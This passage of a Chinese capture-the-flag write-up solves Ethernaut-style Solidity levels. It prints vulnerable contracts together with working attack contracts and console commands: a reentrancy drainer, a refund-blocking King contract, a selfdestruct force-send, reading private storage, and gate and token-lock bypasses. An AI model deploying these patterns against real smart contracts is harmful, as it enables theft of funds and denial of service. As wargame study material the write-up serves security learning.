<p>1）写一个假pwn()，调用它，就拥有pwn()的签名哈希了。<br>2）{data: web3.sha3(“pwn()”).slice(0,10)}，这样获得。</p>
<p>然后随便调一调，触发fallback，就可以触发pwn。</p>
<h2 id="0x07-Force"><a href="#0x07-Force" class="headerlink" title="0x07 Force"></a>0x07 Force</h2><p>喵了个咪？此题考点，合约自杀时将自己的钱强制给别人。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= 0.4.0 &lt; 0.6.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;/*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">  /~____  =ø= /</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*/&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    constructor() public payable&#123;&#125;</span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        selfdestruct(0xa7e1AEfffa71E4217d341C800641B055055a82Cb);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x08-Vault"><a href="#0x08-Vault" class="headerlink" title="0x08 Vault"></a>0x08 Vault</h2><p>这题猜密码，由于区块链上信息是公开的，直接过去看……</p>
<blockquote>
<p>web3.eth.getStorageAt(contract.address, 1, function(x, y) {alert(web3.toAscii(y))});</p>
</blockquote>
<p>(这个getStorageAt是要跟回调函数的，观察得到password是第1个（不是第0个）)</p>
<p>这道题告诉我们，密钥这种东西不要明文上链，加个密什么的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span>.18;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool <span class="keyword">public</span> locked;</span><br><span class="line">  bytes32 <span class="keyword">private</span> password;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">Vault</span><span class="params">(bytes32 _password)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    locked = <span class="keyword">true</span>;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">unlock</span><span class="params">(bytes32 _password)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (password == _password) &#123;</span><br><span class="line">      locked = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x09-King"><a href="#0x09-King" class="headerlink" title="0x09 King"></a>0x09 King</h2><p>比较典型的DDOS了。先看一下当前最高的是多少钱。</p>
<blockquote>
<p>fromWei((await contract.prize()).toNumber())</p>
</blockquote>
<p>给比它多的钱，然后在收到转账时主动抛错。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span>.18;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/ownership/Ownable.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract King is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  address <span class="keyword">public</span> king;</span><br><span class="line">  uint <span class="keyword">public</span> prize;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">King</span><span class="params">()</span> <span class="keyword">public</span> payable </span>&#123;</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() external payable &#123;</span><br><span class="line">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span>.0 &lt; <span class="number">0.6</span>.0;</span><br><span class="line"></span><br><span class="line">contract Attack&#123;</span><br><span class="line">    constructor() <span class="keyword">public</span> payable&#123;</span><br><span class="line">        address param = <span class="number">0xb198e857FE03ABc756660684B0481B31c2DE276f</span>;</span><br><span class="line">        param.call.gas(<span class="number">10000000</span>).value(msg.value)(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//写不带fallback的合约，嗯。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x0A-Re-entrancy"><a href="#0x0A-Re-entrancy" class="headerlink" title="0x0A Re-entrancy"></a>0x0A Re-entrancy</h2><p>典型的Reentrancy，坑死我了，谁tm知道为什么要提两次才能触发，嘤！</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span>.0 &lt; <span class="number">0.6</span>.0;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) <span class="keyword">public</span> balances;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">donate</span><span class="params">(address _to)</span> <span class="keyword">public</span> payable </span>&#123;</span><br><span class="line">    balances[_to] += msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">balanceOf</span><span class="params">(address _who)</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint balance)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">withdraw</span><span class="params">(uint _amount)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      bool is_success;</span><br><span class="line">      bytes memory _bytes;</span><br><span class="line">      (is_success, _bytes) = msg.sender.call.value(_amount)(<span class="string">""</span>);</span><br><span class="line">      <span class="keyword">if</span>(is_success) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">    uint cnt = <span class="number">4</span>;</span><br><span class="line">    address instance_address = <span class="number">0x2381AB4B84B5ae2Bd884A85b07EEc65F313d32A0</span>;</span><br><span class="line">    Reentrance target = Reentrance(<span class="number">0x2381AB4B84B5ae2Bd884A85b07EEc65F313d32A0</span>);</span><br><span class="line"></span><br><span class="line">    constructor() <span class="keyword">public</span> payable&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">donate</span><span class="params">()</span> <span class="keyword">public</span> payable </span>&#123;</span><br><span class="line">        target.donate.value(msg.value)(address(<span class="keyword">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">hack</span><span class="params">()</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">//提两次还行</span></span><br><span class="line">        target.withdraw(<span class="number">0.5</span> ether);</span><br><span class="line">        target.withdraw(<span class="number">0.5</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">get_balance</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span><span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> target.balanceOf(address(<span class="keyword">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">my_eth_bal</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span><span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(<span class="keyword">this</span>).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">ins_eth_bal</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span><span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance_address.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     function () external payable &#123;</span><br><span class="line">        <span class="comment">//控制递归次数</span></span><br><span class="line">        <span class="keyword">while</span>(cnt&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            cnt--;</span><br><span class="line">            target.withdraw(<span class="number">0.5</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x0B-Elevator"><a href="#0x0B-Elevator" class="headerlink" title="0x0B Elevator"></a>0x0B Elevator</h2><p>此题考点，看一下view的文档</p>
<blockquote>
<p>The compiler does not enforce yet that a view method is not modifying state.</p>
</blockquote>
<p>说得很明白了，骚一下即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span>.0 &lt; <span class="number">0.6</span>.0;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Building</span> </span>&#123;</span><br><span class="line">  <span class="function">function <span class="title">isLastFloor</span><span class="params">(uint)</span> view external <span class="title">returns</span> <span class="params">(bool)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool <span class="keyword">public</span> top;</span><br><span class="line">  uint <span class="keyword">public</span> floor;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">goTo</span><span class="params">(uint _floor)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">    address instance_address = <span class="number">0x59857e686c7f63a3C94225B2B075097Bedc1e0E8</span>;</span><br><span class="line">    Elevator target = Elevator(instance_address);</span><br><span class="line">    bool <span class="keyword">public</span> isLast = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">isLastFloor</span><span class="params">(uint)</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(bool)</span> </span>&#123;</span><br><span class="line">        isLast = ! isLast;</span><br><span class="line">        <span class="keyword">return</span> isLast;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">hack</span><span class="params">()</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        target.goTo(<span class="number">1024</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x0C-Privacy"><a href="#0x0C-Privacy" class="headerlink" title="0x0C Privacy"></a>0x0C Privacy</h2><blockquote>
<p>0x00000000000000000000000000000000000000000000000000000006bfff0a01<br>0x45df789a07de17f479f34ff6d72c6eee3cae57ca5096427e21bf5dca5dc7c316<br>0x1c8089d5e83cebf304d293e85d40be526505464db6a18fa6f636d811e462c9c6<br>0x63003058cd232f4440cbc189cbea2763fcc4fbdf748d996c5ecdbb7498d0b9f3<br>0x0000000000000000000000000000000000000000000000000000000000000000</p>
</blockquote>
<p>大端序，solidity不足32位的变量与后面的共享空间。</p>
<p>分析一个，data[2]应该是第四个那个位置的，然后截成bytes16了（人手截）。</p>
<blockquote>
<p>63003058cd232f4440cbc189cbea2763</p>
</blockquote>
<blockquote>
<p>contract.unlock(“0x63003058cd232f4440cbc189cbea2763”);（坑到我了）</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool <span class="keyword">public</span> locked = <span class="keyword">true</span>;</span><br><span class="line">  uint256 <span class="keyword">public</span> constant ID = block.timestamp;</span><br><span class="line">  uint8 <span class="keyword">private</span> flattening = <span class="number">10</span>;</span><br><span class="line">  uint8 <span class="keyword">private</span> denomination = <span class="number">255</span>;</span><br><span class="line">  uint16 <span class="keyword">private</span> awkwardness = uint16(now);</span><br><span class="line">  bytes32[<span class="number">3</span>] <span class="keyword">private</span> data;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">Privacy</span><span class="params">(bytes32[<span class="number">3</span>] _data)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    data = _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">function <span class="title">unlock</span><span class="params">(bytes16 _key)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    require(_key == bytes16(data[<span class="number">2</span>]));</span><br><span class="line">    locked = <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    A bunch of super advanced solidity algorithms...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`</span></span><br><span class="line"><span class="comment">      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,</span></span><br><span class="line"><span class="comment">      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\</span></span><br><span class="line"><span class="comment">      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)</span></span><br><span class="line"><span class="comment">      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x0D-GatekeeperOne"><a href="#0x0D-GatekeeperOne" class="headerlink" title="0x0D GatekeeperOne"></a>0x0D GatekeeperOne</h2><p>gas难以把握。</p>
<h2 id="0x0E-GatekeeperTwo"><a href="#0x0E-GatekeeperTwo" class="headerlink" title="0x0E GatekeeperTwo"></a>0x0E GatekeeperTwo</h2><p>内联汇编，看一下文档。再仔细看。</p>
<blockquote>
<p>extcodesize : Get size of an account’s code.<br>Note that while the initialisation code is executing, the newly created address exists but with no intrinsic body code.<br>……<br>During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account while CODESIZE should return the length of the initialization code.</p>
</blockquote>
<p>所以我们写到构造函数里即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span>.0 &lt; <span class="number">0.6</span>.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address <span class="keyword">public</span> entrant;</span><br><span class="line"></span><br><span class="line">  <span class="function">modifier <span class="title">gateOne</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">modifier <span class="title">gateTwo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x := extcodesize(caller) &#125;</span><br><span class="line">    require(x == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">modifier <span class="title">gateThree</span><span class="params">(bytes8 _gateKey)</span> </span>&#123;</span><br><span class="line">    require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(<span class="number">0</span>) - <span class="number">1</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">enter</span><span class="params">(bytes8 _gateKey)</span> <span class="keyword">public</span> gateOne gateTwo <span class="title">gateThree</span><span class="params">(_gateKey)</span> <span class="title">returns</span> <span class="params">(bool)</span> </span>&#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">    address instance_address = <span class="number">0x088eb6b557f4ca9a263de5897fa24d64091a1dce</span>;</span><br><span class="line">    GatekeeperTwo target = GatekeeperTwo(instance_address);</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">Attack</span><span class="params">()</span></span>&#123;</span><br><span class="line">        target.enter((bytes8)(uint64(keccak256(address(<span class="keyword">this</span>))) ^ (uint64(<span class="number">0</span>) - <span class="number">1</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="00x0F-Naught-Coin"><a href="#00x0F-Naught-Coin" class="headerlink" title="00x0F Naught Coin"></a>00x0F Naught Coin</h2><p>看ERC20Lib中的transferFrom，子合约中并没有实现该接口，我们可以直接调用。先用approve给自己权限。3rd_contract_address是其它地址。</p>
<blockquote>
<p>contract.approve(player, (await contract.INITIAL_SUPPLY()).toNumber())<br>contract.transferFrom(player, 3rd_contract_address, (await contract.INITIAL_SUPPLY()).toNumber())</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">"SafeMathLib.sol"</span></span><br><span class="line"></span><br><span class="line">library ERC20Lib &#123;</span><br><span class="line">  using SafeMathLib <span class="keyword">for</span> uint;</span><br><span class="line"></span><br><span class="line">  struct TokenStorage &#123;</span><br><span class="line">    mapping (address =&gt; uint) balances;</span><br><span class="line">    mapping (address =&gt; mapping (address =&gt; uint)) allowed;</span><br><span class="line">    uint totalSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">event <span class="title">Transfer</span><span class="params">(address indexed from, address indexed to, uint value)</span></span>;</span><br><span class="line">  <span class="function">event <span class="title">Approval</span><span class="params">(address indexed owner, address indexed spender, uint value)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">init</span><span class="params">(TokenStorage storage self, uint _initial_supply)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    self.totalSupply = _initial_supply;</span><br><span class="line">    self.balances[msg.sender] = _initial_supply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">transfer</span><span class="params">(TokenStorage storage self, address _to, uint _value)</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(bool success)</span> </span>&#123;</span><br><span class="line">    self.balances[msg.sender] = self.balances[msg.sender].minus(_value);</span><br><span class="line">    self.balances[_to] = self.balances[_to].plus(_value);</span><br><span class="line">    Transfer(msg.sender, _to, _value);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">transferFrom</span><span class="params">(TokenStorage storage self, address _from, address _to, uint _value)</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(bool success)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _allowance = self.allowed[_from][msg.sender];</span><br><span class="line"></span><br><span class="line">    self.balances[_to] = self.balances[_to].plus(_value);</span><br><span class="line">    self.balances[_from] = self.balances[_from].minus(_value);</span><br><span class="line">    self.allowed[_from][msg.sender] = _allowance.minus(_value);</span><br><span class="line">    Transfer(_from, _to, _value);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">balanceOf</span><span class="params">(TokenStorage storage self, address _owner)</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint balance)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> self.balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">approve</span><span class="params">(TokenStorage storage self, address _spender, uint _value)</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(bool success)</span> </span>&#123;</span><br><span class="line">    self.allowed[msg.sender][_spender] = _value;</span><br><span class="line">    Approval(msg.sender, _spender, _value);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">allowance</span><span class="params">(TokenStorage storage self, address _owner, address _spender)</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint remaining)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> self.allowed[_owner][_spender];</span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"> contract StandardToken &#123;</span><br><span class="line">   using ERC20Lib <span class="keyword">for</span> ERC20Lib.TokenStorage;</span><br><span class="line"></span><br><span class="line">   ERC20Lib.TokenStorage token;</span><br><span class="line"></span><br><span class="line">   string <span class="keyword">public</span> name = <span class="string">"SimpleToken"</span>;</span><br><span class="line">   string <span class="keyword">public</span> symbol = <span class="string">"SIM"</span>;</span><br><span class="line">   uint <span class="keyword">public</span> decimals = <span class="number">18</span>;</span><br><span class="line">   uint <span class="keyword">public</span> INITIAL_SUPPLY = <span class="number">10000</span>;</span><br><span class="line"></span><br><span class="line">   constructor() <span class="keyword">public</span> 